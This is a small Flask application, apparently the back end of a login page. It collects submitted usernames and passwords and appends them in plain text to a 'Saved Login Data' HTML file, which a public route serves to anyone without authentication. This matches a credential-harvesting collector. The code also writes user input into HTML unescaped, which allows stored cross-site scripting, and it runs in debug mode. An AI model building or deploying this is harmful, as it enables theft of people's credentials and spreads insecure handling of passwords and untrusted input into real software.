from flask import Flask, request, jsonify, send_from_directory
import os

app = Flask(__name__, static_folder='')

DATA_FILE = 'data.html'

@app.route('/')
def serve_index():
    return send_from_directory('', 'index.html')

@app.route('/app.js')
def serve_js():
    return send_from_directory('', 'app.js')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify(status='error', message='Missing username or password')

    # Prepare HTML line for saved data
    entry = f"<p><b>Username:</b> {username} | <b>Password:</b> {password}</p>\n"

    # If data.html doesn't exist, create with header
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            f.write('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Saved Data</title></head><body>')
            f.write('<h2>Saved Login Data</h2>\n')

    # Append new data entry
    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(entry)

    return jsonify(status='success', message='Data saved successfully')

@app.route('/data.html')
def serve_data():
    if not os.path.exists(DATA_FILE):
        return "<h3>No data saved yet.</h3>"
    
    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        content = f.read()
    # Ensure file ends properly with closing tags
    if not content.strip().endswith('</html>'):
        content += '</body></html>'
    return content

if __name__ == '__main__':
    app.run(debug=True)
